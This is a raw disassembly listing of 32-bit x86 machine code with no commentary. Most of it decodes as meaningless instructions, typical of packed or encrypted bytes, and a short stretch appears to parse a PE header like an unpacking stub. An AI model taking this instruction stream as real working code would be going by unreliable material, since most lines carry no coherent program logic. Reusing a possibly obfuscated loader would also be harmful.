  40f97b:	sub    ah,ah
  40f97d:	sbb    ch,al
  40f97f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40f981:	lahf   
  40f982:	pop    ebp
  40f983:	add    al,0x88
  40f985:	sub    ecx,DWORD PTR [esi+0x13]
  40f988:	(bad)  [edx]
  40f98a:	or     esp,DWORD PTR [eax+0x149333a7]
  40f990:	neg    BYTE PTR [esi]
  40f992:	iret   
  40f993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f994:	aad    0xa2
  40f996:	xor    bl,ah
  40f998:	sar    edi,1
  40f99a:	iret   
  40f99b:	fsub   DWORD PTR [ecx+eiz*1]
  40f99e:	call   DWORD PTR [esi]
  40f9a0:	stc    
  40f9a1:	inc    esi
  40f9a2:	cmc    
  40f9a3:	mov    bh,0x44
  40f9a5:	or     al,0x2f
  40f9a7:	xchg   ebp,eax
  40f9a8:	lods   al,BYTE PTR ds:[esi]
  40f9a9:	and    BYTE PTR [esi-0x41],ch
  40f9ac:	inc    ecx
  40f9ad:	mov    esi,0x22dc14af
  40f9b2:	adc    DWORD PTR [esi-0x26],ebx
  40f9b5:	or     eax,0x3e902160
  40f9ba:	retf   0x3308
  40f9bd:	dec    esi
  40f9be:	adc    al,0xbf
  40f9c0:	xchg   edx,eax
  40f9c1:	mov    ebp,0xb1269d5c
  40f9c6:	lods   al,BYTE PTR ds:[si]
  40f9c8:	nop
  40f9c9:	or     eax,0xc0ba404
  40f9ce:	push   eax
  40f9cf:	neg    eax
  40f9d1:	arpl   WORD PTR [eax+0x5f],dx
  40f9d4:	push   eax
  40f9d5:	rcr    BYTE PTR [ebx],cl
  40f9d7:	into   
  40f9d8:	dec    ecx
  40f9d9:	jecxz  0x40f9ab
  40f9db:	adc    DWORD PTR [ecx+0x62c170a3],ebx
  40f9e1:	add    DWORD PTR [edx+0x2ed3198a],0x8213175f
  40f9eb:	ins    BYTE PTR es:[edi],dx
  40f9ec:	arpl   di,dx
  40f9ee:	adc    eax,0xfd7e8379
  40f9f3:	aam    0xdd
  40f9f5:	out    0xfc,eax
  40f9f7:	add    al,0x62
  40f9f9:	es xchg ebx,eax
  40f9fb:	hlt    
  40f9fc:	jle    0x40fa6e
  40f9fe:	push   0x941882e5
  40fa03:	mov    eax,ds:0x8f37ea77
  40fa08:	pop    edi
  40fa09:	and    al,0x1e
  40fa0b:	popa   
  40fa0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa0d:	repnz mov ah,0xec
  40fa10:	pop    ebx
  40fa11:	je     0x40fa79
  40fa13:	mov    esp,0xdba48bf3
  40fa18:	add    bh,cl
  40fa1a:	cwde   
  40fa1b:	outs   dx,BYTE PTR ds:[esi]
  40fa1c:	sub    bl,ch
  40fa1e:	js     0x40fa1d
  40fa20:	out    dx,eax
  40fa21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa22:	repnz cli 
  40fa24:	or     BYTE PTR [eax+0x52ac3275],0x65
  40fa2b:	inc    edi
  40fa2c:	div    BYTE PTR [edx]
  40fa2e:	sub    eax,0x67248dfe
  40fa33:	cmp    ecx,edi
  40fa35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa36:	lods   al,BYTE PTR ds:[esi]
  40fa37:	dec    edi
  40fa38:	imul   esp,esp,0x6f5922ba
  40fa3e:	push   cs
  40fa3f:	jo     0x40fa28
  40fa41:	push   0x5f
  40fa43:	jle    0x40fa23
  40fa45:	mov    BYTE PTR [ecx-0x69c808cc],ch
  40fa4b:	push   es
  40fa4c:	sub    BYTE PTR [ebp-0x47acc438],dh
  40fa52:	push   ebx
  40fa53:	mov    ebp,DWORD PTR [eax-0xa2acbbb]
  40fa59:	test   eax,0xaae593b3
  40fa5e:	cdq    
  40fa5f:	cwde   
  40fa60:	sub    BYTE PTR [edi],ch
  40fa62:	dec    esp
  40fa63:	adc    ebx,DWORD PTR [esi]
  40fa65:	cmc    
  40fa66:	into   
  40fa67:	mov    esi,DWORD PTR [eax-0x73]
  40fa6a:	sub    cl,0x46
  40fa6d:	(bad)  
  40fa6e:	jmp    0xb057:0x509f4c6
  40fa75:	and    al,bh
  40fa77:	add    eax,0xa1d26604
  40fa7c:	loopne 0x40fa34
  40fa7e:	fwait
  40fa7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa80:	fwait
  40fa81:	cmp    ch,BYTE PTR [ebp-0x34690992]
  40fa87:	ret    
  40fa88:	mov    ch,0xf8
  40fa8a:	dec    edi
  40fa8b:	cmc    
  40fa8c:	mov    dl,0x24
  40fa8e:	sahf   
  40fa8f:	dec    edx
  40fa90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa91:	jae    0x40fa46
  40fa93:	int    0x88
  40fa95:	mov    esp,0x33bfff9f
  40fa9a:	test   eax,0xbb108d92
  40fa9f:	xchg   ecx,eax
  40faa0:	xchg   BYTE PTR [ecx+edi*4],bl
  40faa3:	cs pop eax
  40faa5:	sub    al,0x9d
  40faa7:	aaa    
  40faa8:	fisubr WORD PTR [esi]
  40faaa:	fistp  WORD PTR [ebp+0x58]
  40faad:	sbb    eax,0xaceb356a
  40fab2:	push   ebp
  40fab3:	sahf   
  40fab4:	sub    ebp,ebx
  40fab6:	cmp    ecx,esi
  40fab8:	add    dh,BYTE PTR [edi]
  40faba:	test   eax,0x92b5579
  40fabf:	das    
  40fac0:	mov    ebx,0xbf51d537
  40fac5:	lock xor bh,cl
  40fac8:	mov    ebp,0x922de601
  40facd:	icebp  
  40face:	(bad)  
  40fad0:	xor    BYTE PTR [eax+0x6c87b33b],dl
  40fad6:	dec    edx
  40fad7:	in     eax,dx
  40fad8:	(bad)  
  40fad9:	fadd   st,st(7)
  40fadb:	lea    esp,[ecx+0x77]
  40fade:	addr16 (bad) 
  40fae1:	push   edi
  40fae2:	cmp    edi,DWORD PTR [ecx-0x7c35cefd]
  40fae8:	cmp    al,0x6c
  40faea:	mov    edx,0xd6519f1d
  40faef:	jle    0x40facf
  40faf1:	sar    DWORD PTR [ebx],1
  40faf3:	inc    esp
  40faf4:	sar    BYTE PTR [edx],cl
  40faf6:	and    BYTE PTR [ecx],0x5a
  40faf9:	jmp    0xfe21e95
  40fafe:	bound  ebp,QWORD PTR [ecx+0x2ac94504]
  40fb04:	stc    
  40fb05:	pop    ss
  40fb06:	pop    ss
  40fb07:	shl    DWORD PTR [esi],1
  40fb09:	sbb    cl,BYTE PTR [edi+0x26]
  40fb0c:	bswap  ebx
  40fb0e:	adc    DWORD PTR [esi],edx
  40fb10:	xchg   esi,eax
  40fb11:	ins    DWORD PTR es:[edi],dx
  40fb12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb13:	ins    DWORD PTR es:[edi],dx
  40fb14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb15:	cmp    DWORD PTR [eax-0x37],edx
  40fb18:	sbb    eax,0x31a4ccb2
  40fb1d:	shl    BYTE PTR [ecx+esi*4+0x5d7237b6],0xda
  40fb25:	xor    dh,BYTE PTR [edx+0x58]
  40fb28:	cld    
  40fb29:	(bad)  
  40fb2a:	lods   eax,DWORD PTR ds:[esi]
  40fb2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb2c:	int3   
  40fb2d:	adc    BYTE PTR [edi],0xaf
  40fb30:	add    BYTE PTR [eax],bh
  40fb32:	cwde   
  40fb33:	sti    
  40fb34:	repz or DWORD PTR [ecx-0x5321b58f],ebx
  40fb3b:	cs aad 0x8f
  40fb3e:	jmp    0x175c6dcb
  40fb43:	iret   
  40fb44:	cwde   
  40fb45:	jp     0x40fb0c
  40fb47:	dec    edi
  40fb48:	pop    edx
  40fb49:	aas    
  40fb4a:	jecxz  0x40fb84
  40fb4c:	js     0x40fb80
  40fb4e:	outs   dx,BYTE PTR ds:[esi]
  40fb4f:	dec    ebp
  40fb50:	dec    eax
  40fb51:	sbb    al,0xd
  40fb53:	or     eax,edi
  40fb55:	test   BYTE PTR [ecx],al
  40fb57:	(bad)  
  40fb58:	fstp   QWORD PTR [ebx+0x21]
  40fb5b:	dec    esp
  40fb5c:	rol    BYTE PTR [edx],0x86
  40fb5f:	mov    esi,0x2d7f203a
  40fb64:	icebp  
  40fb65:	add    eax,0xabdeb99b
  40fb6a:	adc    cl,0xa2
  40fb6d:	test   BYTE PTR [ebx-0x27],ah
  40fb70:	(bad)  
  40fb71:	addr16 mov al,cs:0x948e
  40fb76:	add    BYTE PTR [esi+0x18],al
  40fb79:	push   ebx
  40fb7a:	mov    edx,0x3e630a94
  40fb7f:	jmp    0x1aad9e20
  40fb84:	rol    DWORD PTR [esi-0x3e004bee],1
  40fb8a:	xchg   esi,eax
  40fb8b:	fst    QWORD PTR [edi+esi*2+0x75]
  40fb8f:	lods   al,BYTE PTR ds:[esi]
  40fb90:	scas   eax,DWORD PTR es:[edi]
  40fb91:	ins    DWORD PTR es:[edi],dx
  40fb92:	lods   eax,DWORD PTR ds:[esi]
  40fb93:	mov    eax,0x47c6ae8a
  40fb98:	mov    ecx,0x1df75167
  40fb9d:	and    al,0xe1
  40fb9f:	inc    edx
  40fba0:	add    cl,ch
  40fba2:	lds    eax,FWORD PTR [ebx]
  40fba4:	add    BYTE PTR [eax],al
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x19
  40fbb3:	jp     0x40fb54
  40fbb5:	in     al,0x82
  40fbb7:	mov    cl,0x70
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fc02
  40fbbf:	mov    al,ds:0xfb53d73
  40fbc4:	stos   DWORD PTR es:[edi],eax
  40fbc5:	iret   
  40fbc6:	fwait
  40fbc7:	cdq    
  40fbc8:	stos   DWORD PTR es:[edi],eax
  40fbc9:	sbb    BYTE PTR [ebx],bh
  40fbcb:	inc    ebp
  40fbcc:	lods   eax,DWORD PTR ds:[esi]
  40fbcd:	(bad)  
  40fbce:	nop
  40fbcf:	sub    edx,eax
  40fbd1:	scas   eax,DWORD PTR es:[edi]
  40fbd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd3:	mov    ebp,0x3c476f79
  40fbd8:	rcr    DWORD PTR [ebp+0x60],0x5c
  40fbdc:	fisubr WORD PTR [eax+0x3e]
  40fbdf:	sub    BYTE PTR [ecx],ah
  40fbe1:	add    eax,0x4c0536b1
  40fbe6:	ret    0xe053
  40fbe9:	clc    
  40fbea:	mov    ah,0xc8
  40fbec:	sub    bl,BYTE PTR [esi]
  40fbee:	adc    eax,0xc6242ef7
  40fbf3:	fdiv   QWORD PTR [ecx-0xb]
  40fbf6:	cli    
  40fbf7:	sub    edi,DWORD PTR [edi-0xa]
  40fbfa:	pop    ebx
  40fbfb:	sti    
  40fbfc:	lods   al,BYTE PTR ds:[esi]
  40fbfd:	out    dx,eax
  40fbfe:	mov    ecx,0x5e5b67b5
  40fc03:	mov    DWORD PTR ds:0x719c0ac8,eax
  40fc09:	test   esp,ebp
  40fc0b:	mov    dh,ch
  40fc0d:	jge    0x40fbc8
  40fc0f:	(bad)  
  40fc10:	call   0xc41d:0x2ef1b210
  40fc17:	ins    DWORD PTR es:[edi],dx
  40fc18:	clc    
  40fc19:	shl    BYTE PTR [eax-0x1b],cl
  40fc1c:	call   0xcc70ca5a
  40fc21:	fimul  WORD PTR [esi+eiz*8+0x9]
  40fc25:	in     al,0x44
  40fc27:	hlt    
  40fc28:	outs   dx,DWORD PTR ds:[esi]
  40fc29:	rcr    BYTE PTR [edx],1
  40fc2b:	push   eax
  40fc2c:	adc    eax,0x6c8a9277
  40fc31:	push   es
  40fc32:	call   0x1140bdb9
  40fc37:	add    al,0x7b
  40fc39:	jne    0x40fc57
  40fc3b:	jle    0x40fbdd
  40fc3d:	jp     0x40fc55
  40fc3f:	mov    al,bh
  40fc41:	dec    ebp
  40fc42:	jg     0x40fbe7
  40fc44:	mov    ds:0x1ff80de6,eax
  40fc49:	pop    eax
  40fc4a:	lock rcr ch,0x40
  40fc4e:	sbb    DWORD PTR [edi-0x611f393a],edx
  40fc54:	out    dx,al
  40fc55:	jne    0x40fbed
  40fc57:	test   eax,0x4e7700d5
  40fc5c:	jno    0x40fc9e
  40fc5e:	xor    al,BYTE PTR [eax+0x4b]
  40fc61:	sahf   
  40fc62:	adc    DWORD PTR [ebx+ebp*1-0x6264c8ec],esp
  40fc69:	sub    ebp,DWORD PTR [eax]
  40fc6b:	std    
  40fc6c:	jecxz  0x40fce7
  40fc6e:	xchg   BYTE PTR [eax-0x31],bh
  40fc71:	and    ch,BYTE PTR [esi+0x7d8765ed]
  40fc77:	pmullw mm3,QWORD PTR [ebx]
  40fc7a:	push   ds
  40fc7b:	cmp    BYTE PTR [esi-0x15],cl
  40fc7e:	jne    0x40fcb6
  40fc80:	sub    esp,ebx
  40fc82:	mov    ah,0x37
  40fc84:	jne    0x40fc4b
  40fc86:	ja     0x40fce9
  40fc88:	xor    al,0xda
  40fc8a:	xor    al,0x89
  40fc8c:	cmp    BYTE PTR [ecx-0x34],ah
  40fc8f:	(bad)  
  40fc90:	arpl   WORD PTR [esi-0x5a07b791],sp
  40fc96:	inc    ebp
  40fc97:	or     ebp,DWORD PTR [edx+0x36]
  40fc9a:	fstp   DWORD PTR [ebx-0x67318dc5]
  40fca0:	xor    DWORD PTR [ebx+0x1],edx
  40fca3:	mov    edx,0x11bfed63
  40fca8:	stc    
  40fca9:	sub    dl,0xfb
  40fcac:	js     0x40fcc1
  40fcae:	mov    bh,0x46
  40fcb0:	call   0x3f88:0x2ea528fe
  40fcb7:	mov    ?,WORD PTR [eax-0x6af105e7]
  40fcbd:	stos   BYTE PTR es:[edi],al
  40fcbe:	retf   
  40fcbf:	add    BYTE PTR [edx+0x5b904fd8],bl
  40fcc5:	xor    eax,0x7e313d5f
  40fcca:	xor    DWORD PTR [ebp-0x1d],ecx
  40fccd:	idiv   DWORD PTR [edx+esi*1+0x5b]
  40fcd1:	sbb    al,0x43
  40fcd3:	sar    DWORD PTR [esi-0x338f0ec7],0x32
  40fcda:	xchg   esi,eax
  40fcdb:	aad    0x27
  40fcdd:	push   ss
  40fcde:	jecxz  0x40fd5f
  40fce0:	mov    gs,WORD PTR [esi-0x41]
  40fce3:	sub    ah,cl
  40fce5:	test   al,0xee
  40fce7:	pop    es
  40fce8:	mov    al,ds:0xdaca76cf
  40fced:	inc    edx
  40fcee:	mov    ds:0x31b2963,eax
  40fcf3:	pop    ebx
  40fcf4:	jg     0x40fc8f
  40fcf6:	push   ebp
  40fcf7:	push   ebx
  40fcf8:	or     DWORD PTR [edx-0xf],ebp
  40fcfb:	mov    ds:0x8bcc064f,eax
  40fd00:	nop
  40fd01:	data16 or al,0xb9
  40fd04:	mov    dl,0x65
  40fd06:	jbe    0x40fcbe
  40fd08:	cmp    eax,0xa4da6962
  40fd0d:	shl    DWORD PTR [ebp+0x44],1
  40fd10:	push   ecx
  40fd11:	pop    esp
  40fd12:	mov    bl,BYTE PTR [ebx+edx*2]
  40fd15:	mov    bh,0x41
  40fd17:	pop    ecx
  40fd18:	mov    ebx,0xb0de4335
  40fd1d:	scas   eax,DWORD PTR es:[edi]
  40fd1e:	mov    ds:0x4b995aeb,al
  40fd23:	mov    ecx,0x7a114028
  40fd28:	test   eax,0x1be59327
  40fd2d:	aas    
  40fd2e:	in     eax,0xd8
  40fd30:	stos   BYTE PTR es:[edi],al
  40fd31:	cmp    DWORD PTR ds:0x855bb2a9,eax
  40fd37:	shl    DWORD PTR [ecx+esi*2],cl
  40fd3a:	cmp    cl,BYTE PTR [eax-0x4b]
  40fd3d:	sub    al,0x8
  40fd3f:	in     al,dx
  40fd40:	lods   al,BYTE PTR ds:[esi]
  40fd41:	push   0xb15ce71
  40fd46:	adc    bh,bh
  40fd48:	push   ebp
  40fd49:	pop    es
  40fd4a:	cmp    eax,0xbd118505
  40fd4f:	mov    fs,WORD PTR [edx]
  40fd51:	mov    esp,0x4ef354c7
  40fd56:	pusha  
  40fd57:	mov    WORD PTR [ebx],gs
  40fd59:	mov    ebp,0xd5dd03e7
  40fd5e:	fcom   DWORD PTR [edx+0x704ed9e8]
  40fd64:	cld    
  40fd65:	pop    edx
  40fd66:	adc    ebx,ebx
  40fd68:	aas    
  40fd69:	or     ebx,DWORD PTR [eax-0x5d8d9ff3]
  40fd6f:	add    al,0xa3
  40fd71:	fld    QWORD PTR [esi]
  40fd73:	pop    ecx
  40fd74:	test   eax,0x1874c1ad
  40fd79:	(bad)  
  40fd7a:	fs mov edi,0xa0ad9468
  40fd80:	inc    esi
  40fd81:	imul   ecx,DWORD PTR [edi+eax*2+0x36],0x6a1072ac
  40fd89:	push   ecx
  40fd8a:	loope  0x40fd55
  40fd8c:	cmp    al,0x54
  40fd8e:	(bad)  
  40fd90:	mov    ecx,0x144f6e70
  40fd95:	imul   ebp,DWORD PTR [edx],0xffffffeb
  40fd98:	push   edi
  40fd99:	jge    0x40fd49
  40fd9b:	add    ah,ch
  40fd9d:	push   es
  40fd9e:	sub    BYTE PTR [ebx+eiz*1+0x284e473c],al
  40fda5:	dec    ebx
  40fda6:	jbe    0x40fd61
  40fda8:	dec    edi
  40fda9:	imul   ah
  40fdab:	or     al,0x8b
  40fdad:	ret    0xaf2e
  40fdb0:	sub    ah,cl
  40fdb2:	add    ah,cl
  40fdb4:	call   0x8139:0xbb9ba035
  40fdbb:	loop   0x40fde8
  40fdbd:	out    0x5a,eax
  40fdbf:	les    edi,FWORD PTR [eax]
  40fdc1:	sub    DWORD PTR [esi+edi*2-0x5474d3be],0xbd6338ad
  40fdcc:	or     ch,cl
  40fdce:	loope  0x40fe2e
  40fdd0:	jg     0x214b1594
  40fdd6:	int    0x22
  40fdd8:	aam    0xee
  40fdda:	sub    BYTE PTR [eax-0x332b5c79],cl
  40fde0:	push   0x38
  40fde2:	data16 fdivp st(3),st
  40fde5:	rcl    ebp,cl
  40fde7:	icebp  
  40fde8:	cdq    
  40fde9:	pop    edx
  40fdea:	lods   al,BYTE PTR ds:[esi]
  40fdeb:	ror    dh,0x8e
  40fdee:	pop    esp
  40fdef:	cmc    
  40fdf0:	dec    ebp
  40fdf1:	mov    esp,0x736546f7
  40fdf6:	scas   al,BYTE PTR es:[edi]
  40fdf7:	(bad)  
  40fdf8:	mov    bl,0xe2
  40fdfa:	jno    0x40fe2b
  40fdfc:	fistp  QWORD PTR [edx+ecx*1+0x5d]
  40fe00:	in     eax,0xd1
  40fe02:	sahf   
  40fe03:	pop    esi
  40fe04:	mov    esp,gs
  40fe06:	or     eax,0xaec26453
  40fe0b:	(bad)  
  40fe0d:	js     0x40fe15
  40fe0f:	lock mov ecx,0xe09713b9
  40fe15:	and    ch,BYTE PTR [eax]
  40fe17:	pop    esi
  40fe18:	jns    0x40fdc3
  40fe1a:	repz jmp 0xe565e945
  40fe20:	push   edx
  40fe21:	sbb    BYTE PTR [eax+0x60],0x49
  40fe25:	fstp   QWORD PTR [edx+0x42ff975]
  40fe2b:	aad    0xc8
  40fe2d:	dec    ecx
  40fe2e:	je     0x40fe77
  40fe30:	mov    esi,0x408d7032
  40fe35:	sub    al,0xfe
  40fe37:	adc    ebx,esp
  40fe39:	pop    esp
  40fe3a:	shld   eax,ebp,cl
  40fe3d:	imul   ecx,DWORD PTR [edi],0x8750223c
  40fe43:	adc    eax,0x543cebde
  40fe48:	shl    BYTE PTR [ecx-0x1948166f],1
  40fe4e:	pop    esi
  40fe4f:	cmp    DWORD PTR [ecx],esi
  40fe51:	movntq QWORD PTR [edi],mm0
  40fe54:	imul   ecx,DWORD PTR [ecx],0xffffffbc
  40fe57:	das    
  40fe58:	call   0x59e3:0xd179ed93
  40fe5f:	push   esi
  40fe61:	fstp   DWORD PTR [edx+edx*8+0x3685afb4]
  40fe68:	push   eax
  40fe69:	pop    DWORD PTR [ebp+0x3]
  40fe6c:	jns    0x40fe25
  40fe6e:	xor    al,0xf2
  40fe70:	fistp  WORD PTR [edi]
  40fe72:	add    eax,DWORD PTR [esi+esi*8-0x72]
  40fe76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe77:	jl     0x40fe69
  40fe79:	and    dh,BYTE PTR [eax-0x6b]
  40fe7c:	mov    al,0xfa
  40fe7e:	pop    ds
  40fe7f:	scas   eax,DWORD PTR es:[edi]
  40fe80:	cwde   
  40fe81:	fmul   QWORD PTR [ebx+eiz*4-0x14]
  40fe85:	xchg   esp,eax
  40fe86:	mov    ebx,0x2c243681
  40fe8b:	mov    al,0xf8
  40fe8d:	xchg   ebx,eax
  40fe8e:	pusha  
  40fe8f:	addr16 push cs
  40fe91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe92:	pushf  
  40fe93:	dec    edx
  40fe94:	xor    DWORD PTR [ebx+0x7c],ebx
  40fe97:	iret   
  40fe98:	call   0x8a91:0x54e038c7
  40fe9f:	jmp    0x26ae:0xba6b6b8a
  40fea6:	mov    al,0x35
  40fea8:	pop    ebp
  40fea9:	daa    
  40feaa:	mov    edi,DWORD PTR [eax]
  40feac:	xor    BYTE PTR [eax+0x643dae41],al
  40feb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feb3:	inc    edi
  40feb4:	jbe    0x40fea1
  40feb6:	push   cs
  40feb7:	sti    
  40feb8:	int3   
  40feb9:	dec    eax
  40feba:	inc    ebx
  40febb:	(bad)  [edi-0x14]
  40febe:	std    
  40febf:	std    
  40fec0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec1:	imul   ebx,DWORD PTR [ebx+0x1ded0c70],0x7f
  40fec8:	jnp    0x40fefe
  40feca:	rcr    BYTE PTR [edi-0xb175e12],0x4d
  40fed1:	loop   0x40fe71
  40fed3:	sub    al,0x6e
  40fed5:	test   al,0xd3
  40fed7:	bnd js 0x40ff12
  40feda:	cs lock das 
  40fedd:	add    BYTE PTR ss:[ecx-0x52],dl
  40fee1:	jmp    0x906:0x462ea75
  40fee8:	ins    DWORD PTR es:[edi],dx
  40fee9:	or     esp,DWORD PTR [ecx]
  40feeb:	push   es
  40feec:	addr16 mov es,eax
  40feef:	ficom  WORD PTR [edi+ebx*2-0x1741dbfd]
  40fef6:	mov    eax,ds:0xf0e54e09
  40fefb:	adc    al,0xf
  40fefd:	sub    DWORD PTR [ebp-0x2a80f1e5],0x19758ffa
  40ff07:	ins    BYTE PTR es:[edi],dx
  40ff08:	data16 adc al,0x48
  40ff0b:	adc    al,0x5a
  40ff0d:	shr    DWORD PTR [edi-0x46],0x2
  40ff11:	mov    ebx,0x1387f932
  40ff16:	fsubr  DWORD PTR [esi+0x3ca12cfd]
  40ff1c:	or     DWORD PTR [ecx],edi
  40ff1e:	adc    ch,dh
  40ff20:	sub    ebx,DWORD PTR [ecx-0x14f68ef1]
  40ff26:	aad    0xc9
  40ff28:	lahf   
  40ff29:	out    0xc4,al
  40ff2b:	jmp    0x1f88:0x829d0667
  40ff32:	packuswb mm1,QWORD PTR [eax-0xf6bdcdf]
  40ff39:	jns    0x40ff36
  40ff3b:	xor    al,0xb3
  40ff3d:	inc    al
  40ff3f:	adc    eax,0x96b14d52
  40ff44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff45:	ja     0x40fef6
  40ff47:	mov    dh,0xfd
  40ff49:	shl    DWORD PTR [edi],1
  40ff4b:	mov    ecx,0xc9cde59f
  40ff50:	sub    eax,0xf67a65a0
  40ff55:	lods   eax,DWORD PTR ds:[esi]
  40ff56:	mov    ecx,0x484af4aa
  40ff5b:	cs mov eax,0x47ee7ceb
  40ff61:	stos   DWORD PTR es:[edi],eax
  40ff62:	and    DWORD PTR [ebx+0x11e342de],esp
  40ff68:	pop    es
  40ff69:	into   
  40ff6a:	faddp  st(7),st
  40ff6c:	inc    ebp
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loope  0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e6f7,0x42fd7e
  40ff8d:	xor    al,0x47
  40ff8f:	mov    DWORD PTR ds:0x42fcd1,0x1793
  40ff99:	cmp    al,0xc3
  40ff9b:	jne    0x410b7f
  40ffa1:	mov    eax,DWORD PTR [ebp+0x8]
  40ffa4:	mov    edx,DWORD PTR ds:0x42fd76
  40ffaa:	and    edx,DWORD PTR ds:0x42e6fb
  40ffb0:	mov    DWORD PTR ds:0x42fd76,edx
  40ffb6:	mov    ecx,DWORD PTR [ebp+0x8]
  40ffb9:	mov    DWORD PTR ds:0x42e703,0x1299
  40ffc3:	add    ecx,DWORD PTR [eax+0x3c]
  40ffc6:	mov    edx,0x7510855
  40ffcb:	jmp    0x410395
  40ffd0:	fcmovnbe st,st(4)
  40ffd2:	aam    0xc8
  40ffd4:	repz enter 0xf3db,0x5c
  40ffd9:	push   edx
  40ffda:	jae    0x40fff5
  40ffdc:	xor    BYTE PTR [edx],bl
  40ffde:	dec    edi
  40ffdf:	mov    dh,0x35
  40ffe1:	mov    ebp,0x7da37070
  40ffe6:	jo     0x410058
  40ffe8:	pop    esi
  40ffe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffea:	push   esp
  40ffeb:	or     BYTE PTR [esi-0x676dfa74],ch
  40fff1:	or     DWORD PTR [ecx-0x52],ebx
  40fff4:	mov    WORD PTR [eax-0xafb8b3d],gs
  40fffa:	scas   eax,DWORD PTR es:[edi]
  40fffb:	mov    cl,0xc7
  40fffd:	mov    esi,?
  40ffff:	mov    cl,0x79
  410001:	cmc    
  410002:	push   ss
  410003:	push   esi
  410004:	push   ebx
  410005:	jmp    0x410013
  410007:	xchg   BYTE PTR [ebp-0x21],ah
  41000a:	push   0x4a
  41000c:	push   ebx
  41000d:	and    al,0xe0
  41000f:	sar    DWORD PTR [eax-0x3],1
  410012:	fdivr  st,st(3)
  410014:	cmp    al,0x83
  410016:	adc    edx,esp
  410018:	stc    
  410019:	loop   0x40ffdf
  41001b:	jns    0x40fff5
  41001d:	(bad)  
  41001e:	cdq    
  41001f:	pop    esp
  410020:	aaa    
  410021:	add    eax,0xe8f468a1
  410026:	xchg   esi,eax
  410027:	cli    
  410028:	push   ebx
  410029:	pop    ebp
  41002a:	in     al,0x63
  41002c:	imul   edx,DWORD PTR [ebp-0x5b168d49],0xffffffd8
  410033:	xchg   DWORD PTR [eax+0x3a],ebx
  410036:	loop   0x40ffdc
  410038:	dec    esp
  410039:	xchg   esi,eax
  41003a:	mov    dh,al
  41003c:	addr16 inc esi
  41003e:	ret    0x816
  410041:	pop    eax
  410042:	xchg   esi,eax
  410043:	in     al,0xd6
  410045:	jge    0x40fff4
  410047:	iret   
  410048:	addr16 int3 
  41004a:	dec    ebx
  41004b:	cwde   
  41004c:	cmp    al,0xc9
  41004e:	inc    eax
  41004f:	ds add al,0x82
  410052:	adc    BYTE PTR [edx-0x5cd24413],ch
  410058:	loop   0x41004e
  41005a:	xchg   DWORD PTR [eax],eax
  41005c:	add    BYTE PTR [esi+ebp*1-0x48],cl
  410060:	cld    
  410061:	retf   0x2017
  410064:	out    0x81,eax
  410066:	mov    bl,0x8
  410068:	jne    0x41002d
  41006a:	fdiv   st,st(5)
  41006c:	jbe    0x41007c
  41006e:	sbb    esp,esi
  410070:	in     eax,0xe7
  410072:	cmp    eax,0x786d90b0
  410077:	inc    ebp
  410078:	aas    
  410079:	pop    esi
  41007a:	xor    DWORD PTR [ecx-0x2b28da74],eax
  410080:	shl    BYTE PTR [edi-0x58],cl
  410083:	into   
  410084:	loopne 0x41008a
  410086:	pushf  
  410087:	push   esp
  410088:	pop    ds
  410089:	cli    
  41008a:	inc    edi
  41008b:	jnp    0x4100a4
  41008d:	shl    cl,0x7a
  410090:	xchg   ecx,eax
  410091:	xchg   ecx,eax
  410092:	push   es
  410093:	pop    esi
  410094:	adc    BYTE PTR [ecx+0xf],ch
  410097:	shl    DWORD PTR ds:0x7d86d3a4,1
  41009d:	push   es
  41009e:	push   esp
  41009f:	je     0x4100f5
  4100a1:	push   0xf8d1f05c
  4100a6:	mov    ebx,0xf5674eb4
  4100ab:	mov    eax,ds:0xd9480802
  4100b0:	pop    esi
  4100b1:	xor    al,0x21
  4100b3:	ss inc ecx
  4100b5:	xchg   ecx,eax
  4100b6:	pop    esp
  4100b7:	jno    0x4100f7
  4100b9:	sbb    bh,BYTE PTR [esi+ecx*4+0x51]
  4100bd:	fwait
  4100be:	int    0xbf
  4100c0:	jle    0x41013b
  4100c2:	daa    
  4100c3:	xchg   edx,eax
  4100c4:	xor    al,BYTE PTR [esi-0x45]
  4100c7:	fucomip st,st(0)
  4100c9:	in     al,0x5e
  4100cb:	cmc    
  4100cc:	clc    
  4100cd:	fld    TBYTE PTR ds:0x65e57b8
  4100d3:	out    dx,eax
  4100d4:	int3   
  4100d5:	cmp    eax,esp
  4100d7:	jb     0x410084
  4100d9:	scas   al,BYTE PTR es:[di]
  4100db:	fistp  DWORD PTR [ebx]
  4100dd:	in     eax,dx
  4100de:	pop    es
  4100df:	or     BYTE PTR [ecx-0x15],ah
  4100e2:	jbe    0x4100c4
  4100e4:	push   cs
  4100e5:	les    edx,FWORD PTR [esi+0x6038569b]
  4100eb:	push   ds
  4100ec:	test   eax,0x41b79ca0
  4100f1:	sbb    DWORD PTR [esi*4-0x50e0cf17],ecx
  4100f8:	push   0x26585347
